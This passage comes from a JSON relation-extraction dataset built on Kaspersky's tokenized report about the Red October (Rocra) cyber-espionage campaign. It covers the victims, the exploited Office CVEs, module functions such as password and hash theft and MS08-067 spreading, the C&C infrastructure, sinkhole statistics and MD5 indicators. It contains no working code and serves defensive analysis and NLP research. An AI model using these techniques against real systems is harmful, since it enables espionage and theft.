"85baebed3d22fa63ce91ffafcd7cc991", "pos": [0, 1], "sent_id": 164, "type": "MD5"}], [{"name": "91ebc2b587a14ec914dd74f4cfb8dd0f", "pos": [1, 2], "sent_id": 164, "type": "MD5"}], [{"name": "93d0222c8c7b57d38931cfd712523c67", "pos": [2, 3], "sent_id": 164, "type": "MD5"}], [{"name": "9950a027191c4930909ca23608d464cc", "pos": [3, 4], "sent_id": 164, "type": "MD5"}], [{"name": "9b55887b3e0c7f1e41d1abdc32667a93", "pos": [4, 5], "sent_id": 164, "type": "MD5"}], [{"name": "9f470a4b0f9827d0d3ae463f44b227db", "pos": [5, 6], "sent_id": 164, "type": "MD5"}], [{"name": "a7330ce1b0f89ac157e335da825b22c7", "pos": [6, 7], "sent_id": 164, "type": "MD5"}], [{"name": "b9238737d22a059ff8da903fbc69c352", "pos": [7, 8], "sent_id": 164, "type": "MD5"}], [{"name": "c78253aefcb35f94acc63585d7bfb176", "pos": [8, 9], "sent_id": 164, "type": "MD5"}], [{"name": "fc3c874bdaedf731439bbe28fc2e6bbe", "pos": [0, 1], "sent_id": 165, "type": "MD5"}], [{"name": "bb2f6240402f765a9d0d650b79cd2560", "pos": [1, 2], "sent_id": 165, "type": "MD5"}], [{"name": "bd05475a538c996cd6cafe72f3a98fae", "pos": [2, 3], "sent_id": 165, "type": "MD5"}], [{"name": "c42627a677e0a6244b84aa977fbea15d", "pos": [3, 4], "sent_id": 165, "type": "MD5"}], [{"name": "cb51ef3e541e060f0c56ac10adef37c3", "pos": [4, 5], "sent_id": 165, "type": "MD5"}], [{"name": "ceac9d75b8920323477e8a4acdae2803", "pos": [5, 6], "sent_id": 165, "type": "MD5"}], [{"name": "cee7bd726bc57e601c85203c5767293c", "pos": [6, 7], "sent_id": 165, "type": "MD5"}], [{"name": "d71a9d26d4bb3b0ed189c79cd24d179a", "pos": [7, 8], "sent_id": 165, "type": "MD5"}], [{"name": "d98378db4016404ac558f9733e906b2b", "pos": [8, 9], "sent_id": 165, "type": "MD5"}], [{"name": "dc4a977eaa2b62ad7785b46b40c61281", "pos": [9, 10], "sent_id": 165, "type": "MD5"}], [{"name": "dc8f0d4ecda437c3f870cd17d010a3f6", "pos": [0, 1], "sent_id": 166, "type": "MD5"}], [{"name": "de56229f497bf51274280ef84277ea54", "pos": [1, 2], "sent_id": 166, "type": "MD5"}], [{"name": "ec98640c401e296a76ab7f213164ef8c", "pos": [0, 1], "sent_id": 167, "type": "MD5"}], [{"name": "f0357f969fbaf798095b43c9e7a0cfa7", "pos": [1, 2], "sent_id": 167, "type": "MD5"}], [{"name": "f16785fc3650490604ab635303e61de2", "pos": [2, 3], "sent_id": 167, "type": "MD5"}]], "labels": [{"r": "P33", "h": 6, "t": 8, "evidence": [7, 8]}, {"r": "P33", "h": 17, "t": 18, "evidence": [45]}, {"r": "P32", "h": 59, "t": 60, "evidence": [130, 134]}, {"r": "P32", "h": 59, "t": 61, "evidence": [130, 134]}], "title": "201301SecureListRedOctober", "sents": [["The", "\"", "Red", "October", "\"", "Campaign", "-", "An", "Advanced", "Cyber", "Espionage"], ["Network", "Targeting", "Diplomatic", "and", "Government", "Agencies"], ["Here", "'s", "a", "link", "to", "the", "full", "paper", "(", "part", "1", ")", "about", "our", "Red", "October", "research", "."], ["During", "the", "next", "days", ",", "we", "'ll", "be", "publishing", "Part", "2", ",", "which", "contains", "a", "detailed", "technical", "analysis", "of", "all", "the", "known", "modules", "."], ["Please", "stay", "tuned", "."], ["During", "the", "past", "five", "years", ",", "a", "high", "-", "level", "cyber", "-", "espionage", "campaign", "has", "successfully", "infiltrated", "computer", "networks", "at", "diplomatic", ",", "governmental", "and", "scientific", "research", "organizations", ",", "gathering", "data", "and", "intelligence", "from", "mobile", "devices", ",", "computer", "systems", "and", "network", "equipment", "."], ["Kaspersky", "Lab", "'s", "researchers", "have", "spent", "several", "months", "analyzing", "this", "malware", ",", "which", "targets", "specific", "organizations", "mostly", "in", "Eastern", "Europe", ",", "former", "USSR", "members", "and", "countries", "in", "Central", "Asia", ",", "but", "also", "in", "Western", "Europe", "and", "North", "America", "."], ["The", "campaign", ",", "identified", "as", "\"", "Rocra", "\"", ",", "short", "for", "\"", "Red", "October", "\"", ",", "is", "currently", "still", "active", "with", "data", "being", "sent", "to", "multiple", "command", "-", "and", "-", "control", "servers", ",", "through", "a", "configuration", "which", "rivals", "in", "complexity", "the", "infrastructure", "of", "the", "Flame", "malware", "."], ["Registration", "data", "used", "for", "the", "purchase", "of", "C&C", "domain", "names", "and", "PE", "timestamps", "from", "collected", "executables", "suggest", "that", "these", "attacks", "date", "as", "far", "back", "as", "May", "2007", "."], ["Some", "key", "findings", "from", "our", "investigation", ":"], ["The", "attackers", "have", "been", "active", "for", "at", "least", "five", "years", ",", "focusing", "on", "diplomatic", "and", "governmental", "agencies", "of", "various", "countries", "across", "the", "world", "."], ["Information", "harvested", "from", "infected", "networks", "is", "reused", "in", "later", "attacks", "."], ["For", "example", ",", "stolen", "credentials", "were", "compiled", "in", "a", "list", "and", "used", "when", "the", "attackers", "needed", "to", "guess", "passwords", "and", "network", "credentials", "in", "other", "locations", "."], ["To", "control", "the", "network", "of", "infected", "machines", ",", "the", "attackers", "created", "more", "than", "60", "domain", "names", "and", "several", "server", "hosting", "locations", "in", "different", "countries", "(", "mainly", "Germany", "and", "Russia", ")", "."], ["The", "C&C", "infrastructure", "is", "actually", "a", "chain", "of", "servers", "working", "as", "proxies", "and", "hiding", "the", "location", "of", "the", "true", "-mothershipcommand", "and", "control", "server", "."], ["The", "attackers", "created", "a", "multi", "-", "functional", "framework", "which", "is", "capable", "of", "applying", "quick", "extension", "of", "the", "features", "that", "gather", "intelligence", "."], ["The", "system", "is", "resistant", "to", "C&C", "server", "takeover", "and", "allows", "the", "attacker", "to", "recover", "access", "to", "infected", "machines", "using", "alternative", "communication", "channels", "."], ["Beside", "traditional", "attack", "targets", "(", "workstations", ")", ",", "the", "system", "is", "capable", "of", "stealing", "data", "from", "mobile", "devices", ",", "such", "as", "smartphones", "(", "iPhone", ",", "Nokia", ",", "Windows", "Mobile", ")", ";", "dumping", "enterprise", "network", "equipment", "configuration", "(", "Cisco", ")", ";", "hijacking", "files", "from", "removable", "disk", "drives", "(", "including", "already", "deleted", "files", "via", "a", "custom", "file", "recovery", "procedure", ")", ";", "stealing", "e", "-", "mail", "databases", "from", "local", "Outlook", "storage", "or", "remote", "POP", "/", "IMAP", "server", ";", "and", "siphoning", "files", "from", "local", "network", "FTP", "servers", "."], ["We", "have", "observed", "the", "use", "of", "at", "least", "three", "different", "exploits", "for", "previously", "known", "vulnerabilities", ":", "CVE-2009", "-", "3129", "(", "MS", "Excel", ")", ",", "CVE-2010", "-", "3333", "(", "MS", "Word", ")", "and", "CVE-2012", "-", "0158", "(", "MS", "Word", ")", "."], ["The", "earliest", "known", "attacks", "used", "the", "exploit", "for", "MS", "Excel", "and", "took", "place", "in", "2010", "and", "2011", ",", "while", "attacks", "targeting", "the", "MS", "Word", "vulnerabilities", "appeared", "in", "the", "summer", "of", "2012", "."], ["The", "exploits", "from", "the", "documents", "used", "in", "spear", "phishing", "were", "created", "by", "other", "attackers", "and", "employed", "during", "different", "cyber", "attacks", "against", "Tibetan", "activists", "as", "well", "as", "military", "and", "energy", "sector", "targets", "in", "Asia", "."], ["The", "only", "thing", "that", "was", "changed", "is", "the", "executable", "which", "was", "embedded", "in", "the", "document", ";", "the", "attackers", "replaced", "it", "with", "their", "own", "code", "."], ["Sample", "fake", "image", "used", "in", "one", "of", "the", "Rocra", "spear", "phishing", "attacks", "."], ["During", "lateral", "movement", "in", "a", "victim", "'s", "network", ",", "the", "attackers", "deploy", "a", "module", "to", "actively", "scan", "the", "local", "area", "network", ",", "find", "hosts", "vulnerable", "for", "MS08", "-", "067", "(", "the", "vulnerability", "exploited", "by", "Conficker", ")", "or", "accessible", "with", "admin", "credentials", "from", "its", "own", "password", "database", "."], ["Another", "module", "used", "collected", "information", "to", "infect", "remote", "hosts", "in", "the", "same", "network", "."], ["Based", "on", "registration", "data", "of", "the", "C&C", "servers", "and", "numerous", "artifacts", "left", "in", "executables", "of", "the", "malware", ",", "we", "strongly", "believe", "that", "the", "attackers", "have", "Russian", "-", "speaking", "origins", "."], ["Current", "attackers", "and", "executables", "developed", "by", "them", "have", "been", "unknown", "until", "recently", ",", "they", "have", "never", "related", "to", "any", "other", "targeted", "cyber", "attacks", "."], ["Notably", ",", "one", "of", "the", "commands", "in", "the", "Trojan", "dropper", "switches", "the", "codepage", "of", "an", "infected", "machine", "to", "1251", "before", "installation", "."], ["This", "is", "required", "to", "address", "files", "and", "directories", "that", "contain", "Cyrillic", "characters", "in", "their", "names", "."], ["Rocra", "FAQ", ":"], ["What", "is", "Rocra", "?"], ["Where", "does", "the", "name", "come", "from", "?"], ["Was", "Operation", "Rocra", "targeting", "any", "specific", "industries", ",", "organizations", "or", "geographical", "regions", "?"], ["Rocra", "(", "short", "for", "\"", "Red", "October", "\"", ")", "is", "a", "targeted", "attack", "campaign", "that", "has", "been", "going", "on", "for", "at", "least", "five", "years", "."], ["It", "has", "infected", "hundreds", "of", "victims", "around", "the", "world", "in", "eight", "main", "categories", ":", "1", "."], ["Government", "2", "."], ["Diplomatic", "/", "embassies", "3", "."], ["Research", "institutions", "4", "."], ["Trade", "and", "commerce", "5", "."], ["Nuclear", "/", "energy", "research", "6", "."], ["Oil", "and", "gas", "companies", "7", "."], ["Aerospace", "8", "."], ["Military"], ["It", "is", "quite", "possible", "there", "are", "other", "targeted", "sectors", "which", "have", "n't", "been", "discovered", "yet", "or", "have", "been", "attacked", "in", "the", "past", "."], ["How", "and", "when", "was", "it", "discovered", "?"], ["We", "have", "come", "by", "the", "Rocra", "attacks", "in", "October", "2012", ",", "at", "the", "request", "of", "one", "of", "our", "partners", "."], ["By", "analysing", "the", "attack", ",", "the", "spear", "phishing", "and", "malware", "modules", ",", "we", "understood", "the", "scale", "of", "this", "campaign", "and", "started", "dissecting", "it", "in", "depth", "."], ["Who", "provided", "you", "with", "the", "samples", "?"], ["Our", "partner", "who", "originally", "pointed", "us", "to", "this", "malware", "prefers", "to", "remain", "anonymous", "."], ["How", "many", "infected", "computers", "have", "been", "identified", "by", "Kaspersky", "Lab", "?"], ["How", "many", "victims", "are", "there", "?"], ["What", "is", "the", "estimated", "size", "of", "Operation", "Red", "October", "on", "a", "global", "scale", "?"], ["During", "the", "past", "months", ",", "we", "'ve", "counted", "several", "hundreds", "of", "infections", "worldwide", "-", "all", "of", "them", "in", "top", "locations", "such", "as", "government", "networks", "and", "diplomatic", "institutions", "."], ["The", "infections", "we", "'ve", "identified", "are", "distributed", "mostly", "in", "Eastern", "Europe", ",", "but", "there", "are", "also", "reports", "coming", "from", "North", "America", "and", "Western", "European", "countries", "such", "as", "Switzerland", "or", "Luxembourg", "."], ["Based", "on", "our", "Kaspersky", "Security", "Network", "(", "KSN", ")", "here", "'s", "a", "list", "of", "countries", "with", "most", "infections", "(", "only", "for", "those", "with", "more", "than", "5", "victims", "):", "Country", "Infections", "RUSSIAN", "FEDERATION", "35", "KAZAKHSTAN", "21", "AZERBAIJAN", "15", "BELGIUM", "15", "INDIA"], ["14", "AFGHANISTAN", "10", "ARMENIA", "10", "IRAN", ";", "ISLAMIC", "REPUBLIC", "OF", "7", "TURKMENISTAN", "7", "UKRAINE", "6", "UNITED", "STATES", "6", "VIET", "NAM", "6", "BELARUS", "5", "GREECE", "5", "ITALY", "5", "MOROCCO", "5", "PAKISTAN", "5", "SWITZERLAND", "5", "UGANDA", "5", "UNITED", "ARAB", "EMIRATES", "5", "For", "the", "sinkhole", "statistics", "see", "below", "."], ["Who", "is", "behind", "/", "responsible", "for", "this", "operation", "?"], ["Is", "this", "a", "nation", "-", "state", "sponsored", "attack", "?"], ["The", "information", "we", "have", "collected", "so", "far", "does", "not", "appear", "to", "point", "towards", "any", "specific", "location", ",", "however", ",", "two", "important", "factors", "stand", "out", ":"], ["The", "exploits", "appear", "to", "have", "been", "created", "by", "Chinese", "hackers", "."], ["The", "Rocra", "malware", "modules", "have", "been", "created", "by", "Russian", "-", "speaking", "operatives", "."], ["Currently", ",", "there", "is", "no", "evidence", "linking", "this", "with", "a", "nation", "-", "state", "sponsored", "attack", "."], ["The", "information", "stolen", "by", "the", "attackers", "is", "obviously", "of", "the", "highest", "level", "and", "includes", "geopolitical", "data", "which", "can", "be", "used", "by", "nation", "states", "."], ["Such", "information", "could", "be", "traded", "in", "the", "underground", "and", "sold", "to", "the", "highest", "bidder", ",", "which", "can", "be", "of", "course", ",", "anywhere", "."], ["Are", "there", "any", "interesting", "texts", "in", "the", "malware", "that", "can", "suggest", "who", "the", "attackers", "are", "?"], ["Several", "Rocra", "modules", "contain", "interesting", "typos", "and", "mis", "-", "spellings", ":"], ["network_scanner", ":", "\"", "SUCCESSED", "\"", ",", "\"", "Error_massage", "\"", ",", "\"", "natrive_os", "\"", ",", "\"", "natrive_lan", "\"", "imapispool", ":", "\"", "UNLNOWN_PC_NAME", "\"", ",", "\"", "WinMain", ":", "error", "CreateThred", "stop", "\""], ["mapi_client", ":", "\"", "Default", "Messanger", "\"", ",", "\"", "BUFEER", "IS", "FULL", "\"", "msoffice_plugin", ":", "\"", "my_encode", "my_dencode", "\"", "winmobile", ":", "\"", "Zakladka", "injected", "\"", ",", "\"", "Can", "not", "inject", "zakladka", ",", "Error", ":", "%", "u", "\"", "PswSuperMailRu", ":", "\"", "-------PROGA", "START-----", "\"", ",", "\"", "-------PROGA", "END-----", "\""], ["The", "word", "\"", "PROGA", "\"", "used", "in", "here", "might", "refer", "to", "transliteration", "of", "Russian", "slang", "\"", "\u041f\u0420\u041e\u0413\u0410", "\"", ",", "which", "literally", "means", "an", "application", "or", "a", "program", "among", "Russian", "-", "speaking", "software", "engineers", "."], ["In", "particular", ",", "the", "word", "\"", "Zakladka", "\"", "in", "Russian", "can", "mean", ":", "\"", "bookmark", "\"", "(", "more", "likely", ")", "a", "slang", "term", "meaning", "\"", "undeclared", "functionality", "\"", ",", "i.e.", "in", "software", "or", "hardware", "."], ["However", ",", "it", "may", "also", "mean", "a", "microphone", "embedded", "in", "a", "brick", "of", "the", "embassy", "building", "."], ["The", "C++", "class", "that", "holds", "the", "C&C", "configuration", "parameters", "is", "called", "\"", "MPTraitor", "\"", "and", "the", "corresponding", "configuration", "section", "in", "the", "resources", "is", "called", "\"", "conn_a", "\"", "."], ["Some", "examples", "include", ":", "What", "kind", "of", "information", "is", "being", "hijacked", "from", "infected", "machines", "?"], ["Information", "stolen", "from", "infected", "systems", "includes", "documents", "with", "extensions", ":", "txt", ",", "csv", ",", "eml", ",", "doc", ",", "vsd", ",", "sxw", ",", "odt", ",", "docx", ",", "rtf", ",", "pdf", ",", "mdb", ",", "xls", ",", "wab", ",", "rst", ",", "xps", ",", "iau", ",", "cif", ",", "key", ",", "crt", ",", "cer", ",", "hse", ",", "pgp", ",", "gpg", ",", "xia", ",", "xiu", ",", "xis", ",", "xio", ",", "xig", ",", "acidcsa", ",", "acidsca", ",", "aciddsk", ",", "acidpvr", ",", "acidppr", ",", "acidssa", "."], ["In", "particular", ",", "the", "\"", "acid", "*", "\"", "extensions", "appear", "to", "refer", "to", "the", "classified", "software", "\"", "Acid", "Cryptofiler", "\"", ",", "which", "is", "used", "by", "several", "entities", "such", "as", "the", "European", "Union", "and/or", "NATO", "."], ["What", "is", "the", "purpose", "/", "objective", "of", "this", "operation", "?"], ["What", "were", "the", "attackers", "looking", "for", "by", "conducting", "this", "sustained", "cyber", "-", "espionage", "campaign", "for", "so", "many", "years", "?"], ["The", "main", "purpose", "of", "the", "operation", "appears", "to", "be", "the", "gathering", "of", "classified", "information", "and", "geopolitical", "intelligence", ",", "although", "it", "seems", "that", "the", "information", "gathering", "scope", "is", "quite", "wide", "."], ["During", "the", "past", "five", "years", ",", "the", "attackers", "collected", "information", "from", "hundreds", "of", "high", "profile", "victims", "although", "it", "'s", "unknown", "how", "the", "information", "was", "used", "."], ["It", "is", "possible", "that", "the", "information", "was", "sold", "on", "the", "black", "market", ",", "or", "used", "directly", "."], ["What", "are", "the", "infection", "mechanisms", "for", "the", "malware", "?"], ["Does", "it", "have", "self", "-", "propagating", "(", "worm", ")", "capabilities", "?"], ["How", "does", "it", "work", "?"], ["Do", "the", "attackers", "have", "a", "customized", "attack", "platform", "?"], ["The", "main", "malware", "body", "acts", "as", "a", "point", "of", "entry", "into", "the", "system", "which", "can", "later", "download", "modules", "used", "for", "lateral", "movement", "."], ["After", "initial", "infection", ",", "the", "malware", "wo", "n't", "propagate", "by", "itself", "-", "typically", ",", "the", "attackers", "would", "gather", "information", "about", "the", "network", "for", "a", "few", "days", ",", "identify", "key", "systems", "and", "then", "deploy", "modules", "which", "can", "compromise", "other", "computers", "in", "the", "network", ",", "for", "instance", "by", "using", "the", "MS08", "-", "067", "exploit", "."], ["In", "general", ",", "the", "Rocra", "framework", "is", "designed", "for", "executing", "\"", "tasks", "\"", "that", "are", "provided", "by", "its", "C&C", "servers", "."], ["Most", "of", "the", "tasks", "are", "provided", "as", "one", "-", "time", "PE", "DLL", "libraries", "that", "are", "received", "from", "the", "server", ",", "executed", "in", "memory", "and", "then", "immediately", "discarded", "."], ["Several", "tasks", "however", "need", "to", "be", "constantly", "present", "in", "the", "system", ",", "i.e.", "waiting", "for", "the", "iPhone", "or", "Nokia", "mobile", "to", "connect", "."], ["These", "tasks", "are", "provided", "as", "PE", "EXE", "files", "and", "are", "installed", "in", "the", "infected", "machine", "."], ["Examples", "of", "\"", "persistent", "\"", "tasks"], ["Once", "a", "USB", "drive", "is", "connected", ",", "search", "and", "extract", "files", "by", "mask", "/", "format", ",", "including", "deleted", "files", "."], ["Deleted", "files", "are", "restored", "using", "a", "built", "in", "file", "system", "parser"], ["Wait", "for", "an", "iPhone", "or", "a", "Nokia", "phone", "to", "be", "connected", "."], ["Once", "connected", ",", "retrieve", "information", "about", "the", "phone", ",", "its", "phone", "book", ",", "contact", "list", ",", "call", "history", ",", "calendar", ",", "SMS", "messages", ",", "browsing", "history"], ["Wait", "for", "a", "Windows", "Mobile", "phone", "to", "be", "connected", "."], ["Once", "connected", ",", "infect", "the", "phone", "with", "a", "mobile", "version", "of", "the", "Rocra", "main", "component"], ["Wait", "for", "a", "specially", "crafted", "Microsoft", "Office", "or", "PDF", "document", "and", "execute", "a", "malicious", "payload", "embedded", "in", "that", "document", ",", "implementing", "a", "one", "-", "way", "covert", "channel", "of", "communication", "that", "can", "be", "used", "to", "restore", "control", "of", "the", "infected", "machine"], ["Record", "all", "the", "keystrokes", ",", "make", "screenshots", "Execute", "additional", "encrypted", "modules", "according", "to", "a", "pre", "-", "defined", "schedule"], ["Retrieve", "e", "-", "mail", "messages", "and", "attachments", "from", "Microsoft", "Outlook", "and", "from", "reachable", "mail", "servers", "using", "previously", "obtained", "credentials", "Examples", "of", "\"", "one", "-", "time", "\"", "tasks"], ["Collect", "general", "software", "and", "hardware", "environment", "information"], ["Collect", "filesystem", "and", "network", "share", "information", ",", "build", "directory", "listings", ",", "search", "and", "retrieve", "files", "by", "mask", "provided", "by", "the", "C&C", "server", "Collect", "information", "about", "installed", "software", ",", "most", "notably", "Oracle", "DB", ",", "RAdmin", ",", "IM", "software", "including", "Mail", ".", "Ru", "agent", ",", "drivers", "and", "software", "for", "Windows", "Mobile", ",", "Nokia", ",", "SonyEricsson", ",", "HTC", ",", "Android", "phones", ",", "USB", "drives", "Extract", "browsing", "history", "from", "Chrome", ",", "Firefox", ",", "Internet", "Explorer", ",", "Opera"], ["Extract", "saved", "passwords", "for", "Web", "sites", ",", "FTP", "servers", ",", "mail", "and", "IM", "accounts"], ["Extract", "Windows", "account", "hashes", ",", "most", "likely", "for", "offline", "cracking"], ["Extract", "Outlook", "account", "information"], ["Determine", "the", "external", "IP", "address", "of", "the", "infected", "machine"], ["Download", "files", "from", "FTP", "servers", "that", "are", "reachable", "from", "the", "infected", "machine", "(", "including", "those", "that", "are", "connected", "to", "its", "local", "network", ")", "using", "previously", "obtained", "credentials", "Write", "and/or", "execute", "arbitrary", "code", "provided", "within", "the", "task"], ["Perform", "a", "network", "scan", ",", "dump", "configuration", "data", "from", "Cisco", "devices", "if", "available"], ["Perform", "a", "network", "scan", "within", "a", "predefined", "range", "and", "replicate", "to", "vulnerable", "machines", "using", "the", "MS08", "-", "067", "vulnerability", "Replicate", "via", "network", "using", "previously", "obtained", "administrative", "credentials"], ["The", "Rocra", "framework", "was", "designed", "by", "the", "attackers", "from", "scratch", "and", "has", "n't", "been", "used", "in", "any", "other", "operations", "."], ["Was", "the", "malware", "limited", "to", "only", "workstations", "or", "did", "it", "have", "additional", "capabilities", ",", "such", "as", "a", "mobile", "malware", "component", "?"], ["Several", "mobile", "modules", "exist", ",", "which", "are", "designed", "to", "steal", "data", "from", "several", "types", "of", "devices", ":", "Windows", "Mobile"], ["iPhone", "Nokia"], ["These", "modules", "are", "installed", "in", "the", "system", "and", "wait", "for", "mobile", "devices", "to", "be", "connected", "to", "the", "victim", "'s", "machine", "."], ["When", "a", "connection", "is", "detected", ",", "the", "modules", "start", "collecting", "data", "from", "the", "mobile", "phones", "."], ["How", "many", "variants", ",", "modules", "or", "malicious", "files", "were", "identified", "during", "the", "overall", "duration", "of", "Operation", "Red", "October", "?"], ["During", "our", "investigation", ",", "we", "'ve", "uncovered", "over", "1000", "modules", "belonging", "to", "30", "different", "module", "categories", "."], ["These", "have", "been", "created", "between", "2007", "with", "the", "most", "recent", "being", "compiled", "on", "8th", "Jan", "2013", "."], ["Here", "'s", "a", "list", "of", "known", "modules", "and", "categories", ":", "Were", "initial", "attacks", "launched", "at", "select", "\"", "high", "-", "profile", "\"", "victims", "or", "were", "they", "launched", "in", "series", "of", "larger", "(", "wave", ")", "attacks", "at", "organizations", "/", "victims", "?"], ["All", "the", "attacks", "are", "carefully", "tuned", "to", "the", "specifics", "of", "the", "victims", "."], ["For", "instance", ",", "the", "initial", "documents", "are", "customized", "to", "make", "them", "more", "appealing", "and", "every", "single", "module", "is", "specifically", "compiled", "for", "the", "victim", "with", "a", "unique", "victim", "ID", "inside", "."], ["Later", ",", "there", "is", "a", "high", "degree", "of", "interaction", "between", "the", "attackers", "and", "the", "victim", "-", "the", "operation", "is", "driven", "by", "the", "kind", "of", "configuration", "the", "victim", "has", ",", "which", "type", "of", "documents", "the", "use", ",", "installed", "software", ",", "native", "language", "and", "so", "on", "."], ["Compared", "to", "Flame", "and", "Gauss", ",", "which", "are", "highly", "automated", "cyberespionage", "campaigns", ",", "Rocra", "is", "a", "lot", "more", "\"", "personal", "\"", "and", "finely", "tuned", "for", "the", "victims", "."], ["Is", "Rocra", "related", "in", "any", "way", "to", "the", "Duqu", ",", "Flame", "and", "Gauss", "malware", "?"], ["Simply", "put", ",", "we", "could", "not", "find", "any", "connections", "between", "Rocra", "and", "the", "Flame", "/", "Tilded", "platforms", "."], ["How", "does", "Operation", "Rocra", "compare", "to", "similar", "campaigns", "such", "as", "Aurora", "and", "Night", "Dragon", "?"], ["Any", "notable", "similarities", "or", "differences", "?"], ["Compared", "to", "Aurora", "and", "Night", "Dragon", ",", "Rocra", "is", "a", "lot", "more", "sophisticated", "."], ["During", "our", "investigation", "we", "'ve", "uncovered", "over", "1000", "unique", "files", ",", "belonging", "to", "about", "30", "different", "module", "categories", "."], ["Generally", "speaking", ",", "the", "Aurora", "and", "Night", "Dragon", "campaigns", "used", "relatively", "simple", "malware", "to", "steal", "confidential", "information", "."], ["With", "Rocra", ",", "the", "attackers", "managed", "to", "stay", "in", "the", "game", "for", "over", "5", "years", "and", "evade", "detection", "of", "most", "antivirus", "products", "while", "continuing", "to", "exfiltrate", "what", "must", "be", "hundreds", "of", "Terabytes", "by", "now", "."], ["How", "many", "Command", "&", "Control", "servers", "are", "there", "?"], ["Did", "Kaspersky", "Lab", "conduct", "any", "forensic", "analysis", "on", "them", "?"], ["During", "our", "investigation", ",", "we", "uncovered", "more", "than", "60", "domain", "names", "used", "by", "the", "attackers", "to", "control", "and", "retrieve", "data", "from", "the", "victims", "."], ["The", "domain", "names", "map", "to", "several", "dozen", "IPs", "located", "mostly", "in", "Russia", "and", "Germany", "."], ["Here", "'s", "an", "overview", "of", "the", "Rocra", "'s", "command", "and", "control", "infrastructure", ",", "as", "we", "believe", "it", "looks", "from", "our", "investigations", ":", "More", "detailed", "information", "about", "the", "Command", "and", "Control", "servers", "will", "be", "revealed", "at", "a", "later", "date", "."], ["Did", "you", "sinkhole", "any", "of", "the", "Command", "&", "Control", "servers", "?"], ["We", "were", "able", "to", "sinkhole", "six", "of", "the", "over", "60", "domains", "used", "by", "the", "various", "versions", "of", "the", "malware", "."], ["During"], ["the", "monitoring", "period", "(", "2", "Nov", "2012", "-", "10", "Jan", "2013", ")", ",", "we", "registered", "over", "55,000", "connections", "to", "the", "sinkhole", "."], ["The", "number", "of", "different", "IPs", "connecting", "to", "the", "sinkhole", "was", "250", "."], ["From", "the", "point", "of", "view", "of", "country", "distribution", "of", "connections", "to", "the", "sinkhole", ",", "we", "have", "observed", "victims", "in", "39", "countries", ",", "with", "most", "of", "IPs", "being", "from", "Switzerland", "."], ["Kazakhstan", "and", "Greece", "follow", "next", "."], ["Sinkhole", "statistics", "-", "2", "Nov", "2012", "-", "10", "Jan", "2013"], ["Is", "Kaspersky", "Lab", "working", "with", "any", "governmental", "organizations", ",", "Computer", "Emergency"], ["Response", "Teams", "(", "CERTs", ")", ",", "law", "enforcement", "agencies", "or", "security", "companies", "as", "part", "of", "the", "investigation", "and", "disinfection", "efforts", "?"], ["Kaspersky", "Lab", ",", "in", "collaboration", "with", "international", "organizations", ",", "Law", "Enforcement", ",", "Computer", "Emergency"], ["Response", "Teams", "(", "CERTs", ")", "and", "other", "IT", "security", "companies", "is", "continuing", "its", "investigation", "of", "Operation"], ["Red", "October", "by", "providing", "technical", "expertise", "and", "resources", "for", "remediation", "and", "mitigation", "procedures", "."], ["Kaspersky", "Lab", "would", "like", "to", "express", "their", "thanks", "to", ":", "US", "-", "CERT", ",", "the", "Romanian", "CERT", "and", "the", "Belarusian", "CERT", "for", "their", "assistance", "with", "the", "investigation", "."], ["If", "you", "are", "a", "CERT", "and", "would", "like", "more", "information", "about", "infections", "in", "your", "country", ",", "please", "contact", "us", "at", "theflame@kaspersky.com", "."], ["Here", "'s", "a", "link", "to", "the", "full", "paper", "(", "part", "1", ")", "about", "our", "Red", "October", "research", "."], ["During", "the", "next", "days", ",", "we", "'ll", "be", "publishing", "Part", "2", ",", "which", "contains", "a", "detailed", "technical", "analysis", "of", "all", "the", "known", "modules", "."], ["Please", "stay", "tuned", "."], ["A", "list", "of", "MD5s", "of", "known", "documents", "used", "in", "the", "Red", "October", "attacks", ":"], ["114ed0e5298149fc69f6e41566e3717a"], ["1f86299628bed519718478739b0e4b0c", "2672fbba23bf4f5e139b10cacc837e9f"], ["350c170870e42dce1715a188ca20d73b", "396d9e339c1fd2e787d885a688d5c646", "3ded9a0dd566215f04e05340ccf20e0c", "44e70bce66cdac5dc06d5c0d6780ba45"], ["4bfa449f1a351210d3c5b03ac2bd18b1", "4ce5fd18b1d3f551a098bb26d8347ffb", "4daa2e7d3ac1a5c6b81a92f4a9ac21f1", "50bd553568422cf547539dd1f49dd80d", "51edea56c1e83bcbc9f873168e2370af"], ["5d1121eac9021b5b01570fb58e7d4622"], ["5ecec03853616e13475ac20a0ef987b6"], ["5f9b7a70ca665a54f8879a6a16f6adde", "639760784b3e26c1fe619e5df7d0f674"], ["65d277af039004146061ff01bb757a8f", "6b23732895daaad4bd6eae1d0b0fef08", "731c68d2335e60107df2f5af18b9f4c9"], ["7e5d9b496306b558ba04e5a4c5638f9f", "82e518fb3a6749903c8dc17287cebbf8"], ["85baebed3d22fa63ce91ffafcd7cc991", "91ebc2b587a14ec914dd74f4cfb8dd0f", "93d0222c8c7b57d38931cfd712523c67", "9950a027191c4930909ca23608d464cc", "9b55887b3e0c7f1e41d1abdc32667a93", "9f470a4b0f9827d0d3ae463f44b227db", "a7330ce1b0f89ac157e335da825b22c7", "b9238737d22a059ff8da903fbc69c352", "c78253aefcb35f94acc63585d7bfb176"], ["fc3c874bdaedf731439bbe28fc2e6bbe", "bb2f6240402f765a9d0d650b79cd2560", "bd05475a538c996cd6cafe72f3a98fae", "c42627a677e0a6244b84aa977fbea15d", "cb51ef3e541e060f0c56ac10adef37c3", "ceac9d75b8920323477e8a4acdae2803", "cee7bd726bc57e601c85203c5767293c", "d71a9d26d4bb3b0ed189c79cd24d179a", "d98378db4016404ac558f9733e906b2b", "dc4a977eaa2b62ad7785b46b40c61281"], ["dc8f0d4ecda437c3f870cd17d010a3f6", "de56229f497bf51274280ef84277ea54"], ["ec98640c401e296a76ab7f213164ef8c", "f0357f969fbaf798095b43c9e7a0cfa7", "f16785fc3650490604ab635303e61de2"]]}, {"vertexSet": [[{"name": "CrySyS Lab", "pos": [6, 8], "sent_id": 19, "type": "Organization"}], [{"name": "Budapest", "pos": [9, 10], "sent_id": 19, "type": "Location"}], [{"name": "Kaspersky Labs", "pos": [13, 15], "sent_id": 19, "type": "Organization"}], [{"name": "Miniduke", "pos": [20, 21], "sent_id": 19, "type": "Malware"}], [{"name": "Miniduke", "pos": [13, 14], "sent_id": 22, "type": "Malware"}], [{"name": "bg_<sthg>.gif", "pos": [0, 1], "sent_id": 29, "type": "File"}], [{"name": "bg_<sthg>.gif_dec", "pos": [2, 3], "sent_id": 29, "type": "File"}], [{"name": "3e71a9f492101bde28cf9f024d87b496", "pos": [0, 1], "sent_id": 32, "type": "MD5"}], [{"name": "a4ad6b55b1bc9e16123de1388f6ef9bf", "pos": [0, 1], 